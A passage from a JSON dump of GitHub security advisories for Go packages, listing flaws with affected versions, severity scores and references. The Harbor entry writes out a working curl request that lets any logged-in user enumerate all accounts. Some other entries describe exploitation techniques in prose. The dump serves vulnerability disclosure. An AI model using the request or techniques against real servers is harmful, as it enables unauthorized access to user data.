"PACKAGE", "url": "https://github.com/buger/jsonparser"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4C7PV6KEUUM76V4B2J5IFN2U6LEOWB67/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6KUHKDQSEYJNROA66OMN6AAQMGAAN6WI/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0089"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-04T21:51:17Z", "nvd_published_at": "2020-03-19T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4c7m-vv47-7c69", "modified": "2021-05-12T14:55:34Z", "published": "2021-05-18T20:33:05Z", "aliases": ["CVE-2020-14958"], "summary": "Insecure Permissions in Gogs", "details": "In Gogs 0.11.91, MakeEmailPrimary in models/user_mail.go lacks a \"not the owner of the email\" check.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-14958"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/pull/5988"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/82ff0c5852f29daa5f95d965fd50665581e7ea3c"}], "database_specific": {"cwe_ids": ["CWE-281"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T14:55:34Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-xhg2-rvm8-w2jh", "modified": "2023-09-18T20:27:11Z", "published": "2021-05-18T15:42:40Z", "aliases": ["CVE-2019-13209"], "summary": "Rancher Vulnerable to Cross-site Request Forgery (CSRF)", "details": "Rancher 2 through 2.2.4 is vulnerable to a Cross-Site Websocket Hijacking attack that allows an exploiter to gain access to clusters managed by Rancher. The attack requires a victim to be logged into a Rancher server, and then to access a third-party site hosted by the exploiter. Once that is accomplished, the exploiter is able to execute commands against the cluster's Kubernetes API with the permissions and identity of the victim.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.0.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.1.0"}, {"fixed": "2.1.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-13209"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/commit/0ddffe484adccb9e37d9432e8e625d8ebbfb0088"}, {"type": "WEB", "url": "https://forums.rancher.com/t/rancher-release-v2-2-5-addresses-rancher-cve-2019-13209/14801"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-352", "CWE-79"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T16:37:55Z", "nvd_published_at": "2019-09-04T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hgwp-4vp4-qmm2", "modified": "2023-03-02T21:10:45Z", "published": "2021-05-24T16:56:35Z", "aliases": ["CVE-2020-24356"], "summary": "Local Privilege Escalation in cloudflared", "details": "In `cloudflared` versions < 2020.8.1 (corresponding to 0.0.0-20200820025921-9323844ea773 on pkg.go.dev) on Windows, if an administrator has started `cloudflared` and set it to read configuration files from a certain directory, an unprivileged user can exploit a misconfiguration in order to escalate privileges and execute system-level commands. The misconfiguration was due to the way that `cloudflared` reads its configuration file. One of the locations that `cloudflared` reads from (C:\\etc\\) is not a secure by default directory due to the fact that Windows does not enforce access controls on this directory without further controls applied. A malformed config.yaml file can be written by any user. Upon reading this config, `cloudflared` would output an error message to a log file defined in the malformed config. The user-controlled log file location could be set to a specific location that Windows will execute when any user logs in.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/cloudflared"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20200820025921-9323844ea773"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/cloudflared/security/advisories/GHSA-hgwp-4vp4-qmm2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-24356"}, {"type": "WEB", "url": "https://github.com/cloudflare/cloudflared/commit/9323844ea773b1444460fa09295ab8c01a88d97e"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/cloudflared"}], "database_specific": {"cwe_ids": ["CWE-427"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T16:52:03Z", "nvd_published_at": "2020-10-02T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qmfx-75ff-8mw6", "modified": "2021-05-24T21:22:08Z", "published": "2021-05-27T18:41:00Z", "aliases": [], "summary": "Listing of upload directory contents possible", "details": "There's an security issue in prosody-filer versions **< 1.0.1** which leads to unwanted directory listings of download directories. \n\nAn attacker is able to list previous uploads of a certain user by shortening the URL and accessing a URL subdirectors other than `/upload/` (or the corresponding user defined root dir)\n\nVersion 1.0.1 and later fix this problem and allow only direct file access if the full path is known. Directory listings are blocked entirely.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ThomasLeister/prosody-filer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ThomasLeister/prosody-filer/security/advisories/GHSA-qmfx-75ff-8mw6"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T21:22:08Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-p2j5-3f4c-224r", "modified": "2023-10-02T14:25:47Z", "published": "2021-05-18T18:21:21Z", "aliases": ["CVE-2020-13170"], "summary": "Improper Input Validation in HashiCorp Consul", "details": "HashiCorp Consul and Consul Enterprise did not appropriately enforce scope for local tokens issued by a primary data center, where replication to a secondary data center was not enabled. Introduced in 1.4.0, fixed in 1.6.6 and 1.7.4.\n### Specific Go Packages Affected\ngithub.com/hashicorp/consul/agent", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0-beta1"}, {"fixed": "1.6.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.7.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-13170"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/pull/8068"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/242994a016a181d6c62a5bb83189716ad13d4216"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/blob/v1.6.6/CHANGELOG.md"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/blob/v1.7.4/CHANGELOG.md"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T22:01:59Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-wjm3-fq3r-5x46", "modified": "2023-08-30T11:38:17Z", "published": "2021-05-18T21:07:54Z", "aliases": ["CVE-2020-36066"], "summary": "github.com/tidwall/gjson is vulnerable to Denial of service", "details": "GJSON <1.6.5 allows attackers to cause a denial of service (remote) via crafted JSON.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tidwall/gjson"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36066"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/issues/195"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/issues/195#issuecomment-755303148"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/commit/9f58baa7a613f89dfdc764c39e47fd3a15606153"}, {"type": "WEB", "url": "https://github.com/tidwall/match/commit/c2f534168b739a7ec1821a33839fb2f029f26bbc"}, {"type": "PACKAGE", "url": "https://github.com/tidwall/gjson"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0957"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-18T21:00:38Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-3wxm-m9m4-cprj", "modified": "2021-05-20T20:24:22Z", "published": "2021-05-21T16:24:44Z", "aliases": [], "summary": "Import of incorrectly embargoed keys could cause early publication", "details": "### Impact\n\nIf your installation is using the `export-importer` service, there is potential impact.\nIf your installation is not importing keys via the `export-importer` services, your installation is not impacted.\n\nIn versions `0.19.1` and earlier, the `export-importer` service assumed that the server it was importing from had properly embargoed keys for at least 2 hours after their expiry time. There are now known instances of servers that did not properly embargo keys.\n\nThis could allow allow for imported keys to be re-published before they have expired, allowing for potential replay of RPIs.\n\n### Patches\n\nThis is patched in `v0.18.3` and all versions `0.19.2` and later.\n\n### Workarounds\n\nEnsure that the servers you are importing export zip files from are not publishing keys too early. \n\n### References\n\nn/a\n\n### For more information\n\nIf you have any questions or comments about this advisory\n* Open an issue in [exposure-notifications-server](https://github.com/google/exposure-notifications-server/)\n* Email us at [exposure-notifications-feedback@google.com](mailto:exposure-notifications-feedback@google.com)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/exposure-notifications-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.18.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/google/exposure-notifications-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.19.0"}, {"fixed": "0.19.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/exposure-notifications-server/security/advisories/GHSA-3wxm-m9m4-cprj"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:24:22Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-m898-h4pm-pqfr", "modified": "2023-10-02T13:16:52Z", "published": "2021-05-25T18:44:09Z", "aliases": ["CVE-2021-28955"], "summary": "Arbitrary code execution due to an uncontrolled search path for the git binary", "details": "### Impact\n\nThe go language recently addressed a security issue in the way that binaries are found before being executed. Some operating systems like Windows persist to have the current directory being part of the default search path, and having priority over the system-wide path.\n\nThis means that it's possible for a malicious user to craft for example a `git.bat` command, commit it and push it in a repository. Later when git-bug search for the git binary, this malicious executable can take priority  and be executed.\n\n### Who is impacted\n\nThis issue happen on Windows and some other operating systems with a badly configured PATH.\n\nAll version prior to 0.7.2 are vulnerable to this issue.\n\n### Patches\n\nVersion 0.7.2 fix this issue. Users should update as soon as possible.\n\n### References\n\nMore details about this issue can be found [here](https://blog.golang.org/path-security).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/MichaelMure/git-bug"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/MichaelMure/git-bug/security/advisories/GHSA-m898-h4pm-pqfr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-28955"}, {"type": "WEB", "url": "https://github.com/MichaelMure/git-bug/pull/604"}, {"type": "WEB", "url": "https://vuln.ryotak.me/advisories/18"}], "database_specific": {"cwe_ids": ["CWE-427"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-21T21:22:50Z", "nvd_published_at": "2021-03-22T07:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4g52-pqcj-phvh", "modified": "2021-05-20T20:51:00Z", "published": "2021-05-21T16:23:43Z", "aliases": ["CVE-2021-21405"], "summary": "BLS Signature \"Malleability\"", "details": "### Impact\n\n1. BLS signature validation in lotus uses blst library method VerifyCompressed. This method accepts signatures in 2 forms - \"serialized\", and \"compressed\", meaning that BLS signatures can be provided as either of 2 unique byte arrays.\n2. Lotus block validation functions perform a uniqueness check on provided blocks. Two blocks are considered distinct if the CIDs of their blockheader do not match. The CID method for blockheader includes the BlockSig of the block.\n\nThe result of these issues is that it would be possible to punish miners for valid blocks, as there are two different valid block CIDs available for each block, even though this must be unique.\n\n### Patches\n\nBy switching from the go based `blst` bindings over to the bindings in `filecoin-ffi`, the code paths now ensure that all signatures are compressed by size and the way they are deserialized.\nThis happened in https://github.com/filecoin-project/lotus/pull/5393\n\n\n### References\n\n- Original POC: https://gist.github.com/wadeAlexC/2490d522e81a796af9efcad1686e6754", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/filecoin-project/lotus"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/filecoin-project/lotus/security/advisories/GHSA-4g52-pqcj-phvh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-21405"}, {"type": "WEB", "url": "https://github.com/filecoin-project/lotus/pull/5393"}, {"type": "WEB", "url": "https://gist.github.com/wadeAlexC/2490d522e81a796af9efcad1686e6754"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:51:00Z", "nvd_published_at": "2021-04-15T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-78hj-86cr-6j2v", "modified": "2021-05-17T21:56:38Z", "published": "2021-05-18T15:30:22Z", "aliases": ["CVE-2019-12999"], "summary": "Improper Access Control in Lightning Network Daemon", "details": "Lightning Network Daemon (lnd) before 0.7 allows attackers to trigger loss of funds because of Incorrect Access Control.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/lightningnetwork/lnd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.1-beta"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.7.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-12999"}, {"type": "WEB", "url": "https://github.com/lightninglabs/chanleakcheck"}, {"type": "WEB", "url": "https://github.com/lightningnetwork/lnd/commits/master"}, {"type": "WEB", "url": "https://github.com/lightningnetwork/lnd/releases/tag/v0.7.0-beta"}, {"type": "WEB", "url": "https://lists.linuxfoundation.org/pipermail/lightning-dev/2019-September/002174.html"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T21:56:38Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-q547-gmf8-8jr7", "modified": "2023-08-29T23:34:28Z", "published": "2021-05-24T16:57:32Z", "aliases": ["CVE-2020-15216"], "summary": "github.com/russellhaering/goxmldsig vulnerable to Signature Validation Bypass", "details": "### Impact\nWith a carefully crafted XML file, an attacker can completely bypass signature validation and pass off an altered file as a signed one. \n\n### Patches\nA patch is available, all users of goxmldsig should upgrade to v1.1.0.\n\n### For more information\nIf you have any questions or comments about this advisory open an issue at https://github.com/russellhaering/goxmldsig", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/russellhaering/goxmldsig"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/russellhaering/goxmldsig/security/advisories/GHSA-q547-gmf8-8jr7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15216"}, {"type": "WEB", "url": "https://github.com/russellhaering/goxmldsig/commit/f6188febf0c29d7ffe26a0436212b19cb9615e64"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GUH33FPUXED3FHYL25BJOQPRKFGPOMS2/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZECBFD4M4PHBMBOCMSQ537NOU37QOVWP/"}, {"type": "WEB", "url": "https://pkg.go.dev/github.com/russellhaering/goxmldsig?tab=overview"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0050"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T12:54:31Z", "nvd_published_at": "2020-09-29T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vpx7-vm66-qx8r", "modified": "2023-10-02T12:21:10Z", "published": "2021-05-18T20:31:06Z", "aliases": ["CVE-2020-7664"], "summary": "Path Traversal in github.com/unknwon/cae/zip", "details": "The ExtractTo function doesn't securely escape file paths in zip archives which include leading or non-leading \"..\". This allows an attacker to add or replace files system-wide.\n\n### Specific Go Packages Affected\ngithub.com/unknwon/cae/zip", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/unknwon/cae"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7664"}, {"type": "WEB", "url": "https://github.com/unknwon/cae/commit/07971c00a1bfd9dc171c3ad0bfab5b67c2287e11"}, {"type": "PACKAGE", "url": "https://github.com/unknwon/cae/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0228"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUNKNWONCAEZIP-570383"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T20:27:31Z", "nvd_published_at": "2020-06-23T19:38:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2v6x-frw8-7r7f", "modified": "2021-05-17T21:04:15Z", "published": "2021-05-18T15:38:54Z", "aliases": ["CVE-2019-17110"], "summary": "Exposure of Sensitive Information to an Unauthorized Actor in kube-state-metrics", "details": "A security issue was discovered in kube-state-metrics 1.7.x before 1.7.2. An experimental feature was added to v1.7.0 and v1.7.1 that enabled annotations to be exposed as metrics. By default, kube-state-metrics metrics only expose metadata about Secrets. However, a combination of the default kubectl behavior and this new feature can cause the entire secret content to end up in metric labels, thus inadvertently exposing the secret content in metrics.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kube-state-metrics"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.7.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-17110"}, {"type": "WEB", "url": "https://github.com/kubernetes/kube-state-metrics/commit/03122fe3e2df49a9a7298b8af921d3c37c430f7f"}, {"type": "WEB", "url": "https://github.com/kubernetes/kube-state-metrics/commit/2a9ab3a9a0f1c4dbecb6a5577185b33bfac86a96"}, {"type": "WEB", "url": "https://github.com/kubernetes/kube-state-metrics/releases/tag/v1.7.2"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-17T21:04:15Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-77gc-fj98-665h", "modified": "2023-08-30T10:22:12Z", "published": "2021-05-18T19:15:09Z", "aliases": ["CVE-2016-9122"], "summary": "Go JOSE Signature Validation Bypass", "details": "Go JOSE before 1.1.0 suffers from multiple signatures exploitation. The go-jose library supports messages with multiple signatures. However, when validating a signed message the API did not indicate which signature was valid, which could potentially lead to confusion. For example, users of the library might mistakenly read protected header values from an attached signature that was different from the one originally validated", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gopkg.in/square/go-jose.v1"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9122"}, {"type": "WEB", "url": "https://github.com/square/go-jose/pull/111"}, {"type": "WEB", "url": "https://github.com/square/go-jose/commit/2c5656adca9909843c4ff50acf1d2cf8f32da7e6"}, {"type": "WEB", "url": "https://github.com/square/go-jose/commit/789a4c4bd4c118f7564954f441b29c153ccd6a96"}, {"type": "WEB", "url": "https://github.com/square/go-jose/commit/c7581939a3656bb65e89d64da0a52364a33d2507"}, {"type": "WEB", "url": "https://hackerone.com/reports/169629"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2016/11/03/1"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2016/11/03/1"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T18:06:40Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-v24h-pjjv-mcp6", "modified": "2023-10-02T12:27:32Z", "published": "2021-05-27T18:44:09Z", "aliases": ["CVE-2020-5303"], "summary": "Denial of service in Tendermint", "details": "### Description\n\n**Denial of Service 1**\n\nTendermint 0.33.2 and earlier does not limit the number of P2P connection requests. For each p2p connection, Tendermint allocates XXX bytes. Even though this memory is garbage collected once the connection is terminated (due to duplicate IP or reaching a maximum number of inbound peers), temporary memory spikes can lead to OOM (Out-Of-Memory) exceptions. \n\nTendermint 0.33.3 (and 0.32.10) limits the total number of P2P incoming connection requests to to `p2p.max_num_inbound_peers + len(p2p.unconditional_peer_ids)`.\n\nNotes:\n\n- Tendermint does not rate limit P2P connection requests per IP (an attacker can saturate all the inbound slots);\n- Tendermint does not rate limit HTTP(S) requests. If you expose any RPC endpoints to the public, please make sure to put in place some protection (https://www.nginx.com/blog/rate-limiting-nginx/). We may implement this in the future (https://github.com/tendermint/tendermint/issues/1696).\n\n**Denial of Service 2**\n\nTendermint 0.33.2 and earlier does not reclaim `activeID` of a peer after it's removed in `Mempool` reactor. This does not happen all the time. It only happens when a connection fails (for any reason) before the `Peer` is created and added to all reactors. `RemovePeer` is therefore called before `AddPeer`, which leads to always growing memory (`activeIDs` map). The `activeIDs` map has a maximum size of 65535 and the node will panic if this map reaches the maximum. An attacker can create a lot of connection attempts (exploiting Denial of Service 1), which ultimately will lead to the node panicking.\n\nTendermint 0.33.3 (and 0.32.10) claims `activeID` for a peer in `InitPeer`, which is executed before `MConnection` is started.\n\nNotes: \n\n- `InitPeer` function was added to all reactors to combat a similar issue - https://github.com/tendermint/tendermint/issues/3338;\n- Denial of Service 2 is independent of Denial of Service 1 and can be executed without it.\n\n### Specific Go Packages Affected\ngithub.com/tendermint/tendermint/p2p\n\n### Impact\n\n- All full nodes (except for validators who are behind closed networks)\n- Node's memory usage increases, then it panics either in the mempool or due to OOM.\n\n### Patches\n\n- v0.33.3\n- v0.32.10\n- v0.31.12\n\n### Workarounds\n\nNo workarounds.\n\n### References\n\n- https://hackerone.com/reports/820317 (not disclosed yet)\n- https://github.com/tendermint/tendermint/issues/3338\n- https://github.com/tendermint/tendermint/issues/1696\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [tendermint/tendermint](https://github.com/tendermint/tendermint)\n* Email us at [security@tendermint.com](mailto:security@tendermint.com)\n\nMore information can be found [here](https://tendermint.com/security/).\n\n### Credits\n\n- [fudongbai](https://hackerone.com/fudongbai) for discovering and reporting Denial of Service 2\n- Ethan Buchman (@ebuchman) for writing a test case for Denial of Service 2 and Tess Rinearson (@tessr) for fixing it\n- Anton Kaliaev (@melekes) for fixing Denial of Service 1", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tendermint/tendermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.33.0"}, {"fixed": "0.33.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/tendermint/tendermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.31.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/tendermint/tendermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.32.0"}, {"fixed": "0.32.10"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/tendermint/tendermint/security/advisories/GHSA-v24h-pjjv-mcp6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-5303"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/issues/1696"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/issues/3338"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/commit/e2d6859afd7dba4cf97c7f7d412e7d8fc908d1cd"}, {"type": "WEB", "url": "https://hackerone.com/reports/820317"}, {"type": "PACKAGE", "url": "https://github.com/tendermint/tendermint"}, {"type": "WEB", "url": "https://github.com/tendermint/tendermint/blob/master/CHANGELOG.md#denial-of-service-1"}], "database_specific": {"cwe_ids": ["CWE-787", "CWE-789"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-24T21:16:50Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-q9p8-33wc-h432", "modified": "2022-10-05T17:58:07Z", "published": "2021-05-24T16:58:06Z", "aliases": ["CVE-2020-13794"], "summary": "Authenticated users can exploit an enumeration vulnerability in Harbor", "details": "### **Impact**\n\nHidde Smit from Cyber Eagle has discovered an User Enumeration flaw in Harbor. The issue is present in the \"/users\" api endpoint. This endpoint is supposed to be restricted to administrators. This restriction is able to be bypassed and information can be obtained via the \"search\" functionality.\n\nNon-administrator users (such as those created via self-registration) can list all usernames and user IDs by sending a GET request to /api/users/search with parameter \"username\" and value \"_\", as follows:\n\n`curl -X GET \"https://<host>/api/users/search?username=_\" -H \"accept: application/json\" --user <user>:<password>`\n\nThe vulnerability was immediately fixed by the Harbor team and all supported versions were patched. With the patched versions of Harbor, the username is required for search and we have removed the support for querying by email.\n\n### **Patches**\nIf your product uses the affected releases of Harbor, update to either version 2.1.0 or 2.0.3 to fix this issue immediately\n\nhttps://github.com/goharbor/harbor/releases/tag/v2.1.0\nhttps://github.com/goharbor/harbor/releases/tag/v2.0.3\n\n### **Workarounds**\nThere is no workaround for this issue\n\n### **For more information**\nIf you have any questions or comments about this advisory, contact cncf-harbor-security@lists.cncf.io\nView our security policy at https://github.com/goharbor/harbor/security/policy\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13794", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-q9p8-33wc-h432"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-13794"}, {"type": "PACKAGE", "url": "https://github.com/goharbor/harbor"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/releases"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/releases/tag/v2.0.3"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/releases/tag/v2.1.0"}, {"type": "WEB", "url": "https://www.cybereagle.io/blog/cve-2020-13794/"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T12:51:00Z", "nvd_published_at": "2020-09-30T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2c64-vj8g-vwrq", "modified": 